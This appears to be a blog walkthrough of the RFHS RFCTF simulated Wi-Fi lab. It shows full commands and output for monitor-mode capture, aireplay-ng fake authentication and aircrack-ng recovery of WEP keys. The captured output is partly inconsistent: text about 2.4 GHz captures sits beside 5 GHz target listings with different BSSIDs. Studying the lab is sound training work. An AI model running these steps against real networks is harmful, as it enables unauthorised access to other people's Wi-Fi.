@@ -1,0 +1,338 @@
+---
+title: "Cracking WEP with the RFHS RFCTF Wireless Container"
+date: 2026-03-15
+description: "A walkthrough setting up the RFHS RFCTF wireless container and cracking WEP networks using airmon-ng, airodump-ng, and aircrack-ng."
+pageType: writeup
+tags: ["wifi", "ctf", "linux", "tools"]
+draft: false
+---
+
+The [rfhs/rfctf-container](https://github.com/rfhs/rfctf-container) repo provides a self-contained wireless CTF lab that emulates real Wi-Fi access points and clients entirely in software. This post documents my steps to get it running and crack the WEP challenges inside it.
+
+## Challenge Overview
+
+The lab runs 16 access points in total — every challenge ships in both 2.4 GHz and 5 GHz variants:
+
+| SSID prefix | Encryption | Client reconnect interval | Notes |
+|---|---|---|---|
+| `RFHS_WEP64` | WEP 64-bit | every 5 min | active client generates IVs |
+| `RFHS_WEP128` | WEP 128-bit | every 5 min | active client generates IVs |
+| `RFHS_WPA` | WPA-Personal | every 30 sec | frequent reconnects = easy EAPOL capture |
+| `RFHS_WPA_HIDDEN` | WPA-Personal, hidden SSID | every 4 hrs | must discover SSID first |
+| `RFHS_WPA_11r` | WPA + 802.11r (Fast BSS Transition) | every 4 hrs | FBT complicates deauth attacks |
+| `RFHS_WPA_11rw` | WPA + 802.11r + 802.11w (MFP) | every 4 hrs | management frames are protected |
+| `RFHS_WPA_11w1` | WPA + 802.11w mode 1 (MFP optional) | every 4 hrs | deauth still works for unprotected STAs |
+| `RFHS_WPA_11w2` | WPA + 802.11w mode 2 (MFP required) | every 4 hrs | deauth/disassoc frames are rejected |
+
+This post focuses on the WEP challenges. The WPA variants each introduce additional complexity around handshake capture and dictionary attacks.
+
+## Prerequisites
+
+My host Linux kernel doesn't have the modules required to run virtual Wi-Fi cards, so I reach for a full Kali virtual machine instead. I grabbed a QEMU/KVM image from the [Kali platforms page](https://www.kali.org/get-kali/#kali-platforms) since that's what works with Virtual Machine Manager on my Fedora-flavored host.
+
+## Starting the Containers
+
+Inside the Kali VM, install Docker and clone the repo:
+
+```
+sudo apt update
+sudo apt upgrade -y
+sudo apt install -y docker.io
+sudo systemctl enable docker --now
+sudo usermod -aG docker $USER
+
+<reboot>
+
+git clone git@github.com:rfhs/rfctf-container.git
+```
+
+Then run the startup scripts in order. The first two take a few minutes each — a good excuse to grab a beer:
+
+```
+cd startup
+sudo ./00_radio_init.start
+sudo ./01_openwrt.start        # takes ~3 minutes
+sudo ./02_rfctf-client.start   # also takes a few minutes
+```
+
+The RFHS folks use Pentoo (a customized Gentoo) as the attacker image, but for a wider audience Kali is a friendlier choice:
+
+```
+sudo ./04_kali-contestant.start
+```
+
+## Verifying the Environment
+
+Once the startup scripts finish, `docker ps` should show three containers running: the access points (OpenWRT), the simulated clients, and your attacker (Kali):
+
+```
+┌──(kali㉿kali)-[~/rfctf-container/startup]
+└─$ docker ps
+CONTAINER ID   IMAGE               COMMAND                  CREATED          STATUS                             PORTS                                                                              NAMES
+958e7d0df30e   rfhs/kali           "/usr/bin/supervisor…"   42 seconds ago   Up 40 seconds (health: starting)   0.0.0.0:2202->22/tcp, :::2202->22/tcp, 0.0.0.0:8802->8080/tcp, :::8802->8080/tcp   kali-contestant
+6c1d9f2004dd   rfhs/rfctf-client   "/usr/bin/supervisor…"   10 minutes ago   Up 10 minutes (health: starting)                                                                                      rfctf-client
+79a9316880b6   rfhs/openwrt        "/sbin/init"             15 minutes ago   Up 15 minutes (healthy)                                                                                               openwrt
+```
+
+## Attaching to the Attacker Container
+
+Exec into the Kali container (replace the container ID with whatever `docker ps` shows in your environment):
+
+```
+┌──(kali㉿kali)-[~/rfctf-container/startup]
+└─$ docker exec -it 958e7d0df30e /bin/bash
+┌──(root㉿958e7d0df30e)-[~]
+└─#                      
+```
+
+From inside the container, `iw dev` lists the four virtual Wi-Fi cards available to the attacker:
+
+```
+┌──(root㉿958e7d0df30e)-[~]
+└─# iw dev
+phy#37                                                                                                                                                                                                                                                           
+        Interface wlan37                                                                                                                                                                                                                                         
+                ifindex 41                                                                                                                                                                                                                                       
+                wdev 0x2500000001                                                                                                                                                                                                                                
+                addr 6e:11:0c:e6:e6:76                                                                                                                                                                                                                           
+                type managed                                                                                                                                                                                                                                     
+                multicast TXQ:                                                                                                                                                                                                                                   
+                        qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets                                                                                                                                                       
+                        0       0       0       0       0       0       0       0               0                                                                                                                                                                
+phy#36                                                                                                                                                                                                                                                           
+        Interface wlan36                                                                                                                                                                                                                                         
+                ifindex 40                                                                                                                                                                                                                                       
+                wdev 0x2400000001                                                                                                                                                                                                                                
+                addr 0a:94:7f:7b:40:8c
+                type managed
+                multicast TXQ:
+                        qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets
+                        0       0       0       0       0       0       0       0               0
+phy#35
+        Interface wlan35
+                ifindex 39
+                wdev 0x2300000001
+                addr 26:b2:de:ee:ff:03
+                type managed
+                multicast TXQ:
+                        qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets
+                        0       0       0       0       0       0       0       0               0
+phy#34
+        Interface wlan34
+                ifindex 38
+                wdev 0x2200000001
+                addr 3e:6e:8c:09:5c:7b
+                type managed
+                multicast TXQ:
+                        qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets
+                        0       0       0       0       0       0       0       0               0
+```
+
+## Putting a Card in Monitor Mode
+
+First, confirm `airmon-ng` can see all four interfaces:
+
+```
+┌──(root㉿958e7d0df30e)-[~]
+└─# airmon-ng
+                                                               
+PHY     Interface       Driver          Chipset                                                  
+
+phy34   wlan34          ??????          non-mac80211 device? (report this!)
+phy35   wlan35          ??????          non-mac80211 device? (report this!)
+phy36   wlan36          ??????          non-mac80211 device? (report this!)
+phy37   wlan37          ??????          non-mac80211 device? (report this!)
+```
+
+The `????` driver entries are expected for the virtual mac80211_hwsim interfaces — don't worry about them. Enable monitor mode on `wlan37`:
+
+```
+┌──(root㉿958e7d0df30e)-[~]
+└─# airmon-ng start wlan37                                                                       
+
+PHY     Interface       Driver          Chipset
+
+phy34   wlan34          ??????          non-mac80211 device? (report this!)
+phy35   wlan35          ??????          non-mac80211 device? (report this!)
+phy36   wlan36          ??????          non-mac80211 device? (report this!)
+phy37   wlan37          ??????          non-mac80211 device? (report this!)
+                (mac80211 monitor mode vif enabled for [phy37]wlan37 on [phy37]wlan37mon)
+                (mac80211 station mode vif disabled for [phy37]wlan37)
+```
+
+The card is now operating as `wlan37mon` in monitor mode.
+
+## Capturing WEP Traffic
+
+Start a capture targeting WEP networks on channel 11, writing packets to a pcap file:
+
+In a real-world scenario you might wait hours for enough background traffic. In this lab the simulated clients are actively transmitting the whole time, so IVs accumulate quickly — the `aircrack-ng` runs later in this post succeeded with roughly 24,000 IVs each. At the rate visible in the dump output (~4–5 data frames/sec per AP during passive capture), that's around **5–10 minutes** of collection. You can try running `aircrack-ng` on the pcap earlier and re-run it as more IVs come in if it doesn't crack on the first attempt.
+
+```
+┌──(root㉿958e7d0df30e)-[~]                                                                      
+└─# airodump-ng --encrypt WEP --channel 11 -w dump --output-format pcap --band ag wlan37mon      
+```
+
+After ~48 seconds you can already see two WEP targets and their associated stations:
+
+```
+ CH 11 ][ Elapsed: 48 s ][ 2025-09-26 03:13                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                                                 
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                                             
+                                                                                                                                                                                                                                                                 
+ 42:00:00:00:00:00  -18   0      506      216    5  11   54e. WEP  WEP         RFHS_WEP128_2G                                                                                                                                                                    
+ 02:00:00:00:00:00  -18   0      506      216    3  11   54e. WEP  WEP    SKA  RFHS_WEP64_2G                                                                                                                                                                     
+                                                                                                                                                                                                                                                                 
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                                                                                                                               
+                                                                                                                                                                                                                                                                 
+ (not associated)   7A:06:D4:F5:38:09  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   86:12:C4:1D:99:29  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   96:1E:C6:61:62:82  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   5E:75:D1:8D:11:B8  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   2A:46:C3:05:01:D2  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   B6:B1:13:9A:1C:5E  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   E2:B5:38:A8:95:3B  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   86:30:C6:F3:A9:3F  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   6E:CA:F4:94:28:F8  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   2E:62:45:A6:D4:DD  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   0E:7E:9C:2C:76:5A  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   86:FE:54:C3:BE:7B  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   92:6E:66:C4:50:1D  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   8E:62:48:26:9E:66  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   3A:B3:D1:F8:F1:DF  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   9E:E7:25:97:34:38  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   56:9C:1C:8C:04:A2  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   72:16:82:65:50:32  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   4A:05:2E:32:C3:E6  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   D2:89:13:5C:C8:1A  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   4A:E2:D4:23:20:37  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   4E:18:86:7E:7B:97  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   F2:EC:DE:E5:30:5D  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   0A:54:6D:C7:70:15  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   F6:22:06:FA:49:5F  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   82:33:C7:B0:14:49  -49    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   B6:0A:5D:D0:22:85  -49    0 - 1      0        3                                                                                                                                                                                              
+ (not associated)   C6:A0:83:5A:00:0D  -49    0 - 1      0        3                                                                                                                                                                                              
+ (not associated)   F6:48:FF:65:96:EF  -49    0 - 1      0        3                                                                                                                                                                                              
+ (not associated)   82:9A:37:BB:6E:A6  -49    0 - 1     68        4                                                                                                                                                                                              
+ (not associated)   B6:C2:C0:08:B1:DD  -49    0 - 1     68        4                                                                                                                                                                                              
+ (not associated)   0A:78:F9:06:3A:7D  -49    0 - 1     19        4                                                                                                                                                                                              
+ (not associated)   6A:B9:F8:74:64:B5  -49    0 - 1     68        4                                                                                                                                                                                              
+ (not associated)   DA:F7:33:82:48:43  -26    0 - 1      0        1                                                                                                                                                                                              
+ (not associated)   66:12:64:69:22:0A  -49    0 - 1     19        4                                                                                                                                                                                              
+ (not associated)   3A:00:21:9B:CC:CF  -49    0 - 1      0        5                                                                                                                                                                                              
+ 42:00:00:00:00:00  42:EF:4A:DD:A4:F7  -19   54e-54e     0      129                                                                                                                                                                                              
+ 02:00:00:00:00:00  02:00:00:00:25:00  -19    0 - 1      0      312                                                                                                                                                                                              
+ 02:00:00:00:00:00  E6:24:EB:A0:83:83  -19   54e-54e     0      129                                                                                                                                                                                              
+Quitting...                                                    
+```
+
+## Fake Authentication
+
+This step is optional but speeds up key recovery by generating additional IVs. The command tells `aireplay-ng` to authenticate to the WEP64 AP (`-a`) and declare `02:00:00:00:25:00` as the attacker's own source MAC (`-h`) — the address it will present as "our adapter" in the authentication frames it sends:
+
+```
+┌──(root㉿958e7d0df30e)-[~]
+└─# aireplay-ng --fakeauth 0 -a 02:00:00:00:00:00 -h 02:00:00:00:25:00 wlan37mon                                                                                                                                                                                 
+03:13:38  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 11
+
+03:13:38  Sending Authentication Request (Open System)
+03:13:38  Switching to shared key authentication
+
+03:13:40  Sending Authentication Request (Shared Key)
+03:13:40  Authentication 1/2 successful
+03:13:40  You should specify a xor file (-y) with at least 140 keystreambytes
+03:13:40  Trying fragmented shared key fake auth.
+03:13:40  Sending encrypted challenge.
+03:13:40  Authentication 2/2 successful
+03:13:40  Sending Association Request
+03:13:40  Association successful :-) (AID: 1)
+```
+
+The AP accepted the fake association, so traffic from our interface will now be included in the IV count.
+
+## Cracking the Keys
+
+Point `aircrack-ng` at the capture file. It will detect both WEP targets and prompt for which one to attack:
+
+```
+┌──(root㉿0e4e8a8a32d1)-[~]
+└─# aircrack-ng dump-01.cap 
+Reading packets, please wait...
+Opening dump-01.cap
+Read 83450 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  02:00:00:00:01:00  RFHS_WEP64_5G             WEP (26341 IVs)
+   2  42:00:00:00:01:00  RFHS_WEP128_5G            WEP (26249 IVs)
+
+Index number of target network ? 2
+
+Reading packets, please wait...
+Opening dump-01.cap
+Read 83450 packets.
+
+1 potential targets
+```
+
+### WEP128 Key
+
+Selecting target 2 (WEP128) yields the key almost instantly:
+
+```
+                                                                   Aircrack-ng 1.7 
+
+
+                                                     [00:00:00] Tested 1335878 keys (got 23824 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  5   0F(31232) 31(30976) D2(29440) 27(29184) 5C(29184) 35(28928) 83(28928) D4(28928) D8(28928) C4(28672) 23(28416) 9D(28160) 
+    1    0/  1   EE(33536) CB(30720) 7B(29696) 0A(29440) 5F(29184) 9C(29184) 12(28928) C9(28928) CA(28416) 1D(28160) 54(28160) 75(28160) 
+    2    0/  1   DD(34560) 52(29952) 5E(29184) 69(28928) EF(28928) 1D(28672) 66(28672) 70(28672) 28(28416) 5F(28416) 6C(28416) 82(28416) 
+    3    0/  1   EA(35328) 03(30720) 56(30720) 7C(29952) 4B(29696) 80(29696) AE(29696) 25(29440) 4E(29440) 7F(28928) D2(28672) 05(28416) 
+    4    0/  7   DB(31232) 65(30208) D4(29952) 09(29952) 4D(29184) 99(29184) DA(29184) 68(28928) 18(28672) 1B(28416) AD(28416) 77(28160) 
+    5    0/  1   EE(37632) 96(30464) A3(29440) FC(29184) 29(28928) EA(28928) 2B(28416) 22(28160) 4C(28160) 8B(28160) 30(27904) 31(27904) 
+    6    0/  1   FF(36864) 08(30720) 16(29952) D1(29440) BC(28672) CF(28672) B0(28416) B2(28416) E1(28416) 7D(28160) 88(28160) 3F(27648) 
+    7   14/  7   D9(28160) 50(27904) E0(27904) E5(27904) FD(27904) 54(27648) 3D(27392) 81(27392) 97(27392) E8(27392) 20(27136) A4(27136) 
+    8    0/  7   DD(31232) 24(30464) 40(30464) 37(29696) 9F(29696) E5(29440) 93(29184) 67(28928) F6(28928) 15(28416) 3D(28416) 48(28416) 
+    9    0/  2   01(33024) 41(30976) FC(30720) 40(29952) 65(29696) 91(29696) B8(29696) BE(29184) 18(28928) 2E(28928) 2A(28160) A0(28160) 
+   10    0/  1   DB(33024) DF(30976) 19(30208) 2B(29952) BC(29184) 2D(28928) 7C(28672) D0(28672) D3(28672) E6(28672) EC(28672) 34(28416) 
+   11    0/  2   EE(32256) 29(30464) 04(30208) 3A(29952) 5E(29696) 83(29696) E8(29440) FF(29440) 7B(29184) 7D(29184) EF(29184) B0(28928) 
+   12    0/  1   F0(33024) 2B(29952) 85(29696) 4F(29440) 56(29440) DC(29440) 46(28672) C2(28672) 21(28416) 00(28160) DF(28160) E7(28160) 
+
+             KEY FOUND! [ 0F:EE:DD:EA:DB:EE:FF:EE:DD:EA:DB:EE:F0 ] 
+        Decrypted correctly: 100%
+```
+
+### WEP64 Key
+
+Running `aircrack-ng` again and selecting target 1 (WEP64) recovers the shorter key just as quickly:
+
+```
+                                                                   Aircrack-ng 1.7 
+
+
+                                                     [00:00:00] Tested 21618 keys (got 23920 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  9   FE(32256) 0E(30976) 62(30976) 0B(30208) 34(29952) 04(29696) 77(28928) D5(28928) DA(28928) 5C(28416) BC(28416) 36(27904) 
+    1    1/ 15   ED(30976) 79(30464) 1F(30464) 97(30208) 54(29440) F3(28672) 10(28672) 08(28160) B7(27904) FB(27904) 02(27904) 44(27648) 
+    2    7/ 11   FC(28672) 5A(28416) 93(28416) AB(28416) BE(28416) 0F(28160) 3B(28160) F8(28160) BA(27904) C4(27904) 07(27648) 7D(27648) 
+    3    0/ 16   FF(31232) 4D(31232) 97(30976) 61(29696) 69(29184) 56(28672) B9(28672) 54(28672) 64(28416) 1A(28416) 48(28416) 99(28160) 
+    4    0/  1   EE(37632) 83(30208) 3A(29952) 10(29696) 47(29696) 2B(29440) 79(29440) B6(29440) 1A(29184) AB(29184) FE(29184) 3F(28928) 
+
+                         KEY FOUND! [ FE:ED:C0:FF:EE ] 
+        Decrypted correctly: 100%
+```
+
+## A Note on the Two WEP Challenges
+
+There are actually two separate WEP challenge sets in the RFCTF environment — one where an active client is associated to the AP (generating steady IV traffic) and one where there is no client. The captures above targeted the 2.4 GHz networks on channel 11. The lab also has 5 GHz variants; to target those, switch the channel to 44:
+
+```
+┌──(root㉿0e4e8a8a32d1)-[~]
+└─# airodump-ng --encrypt WEP --channel 44 -w dump --output-format pcap --band ag wlan37mon
+```
+
+The cracking workflow is identical from that point on.
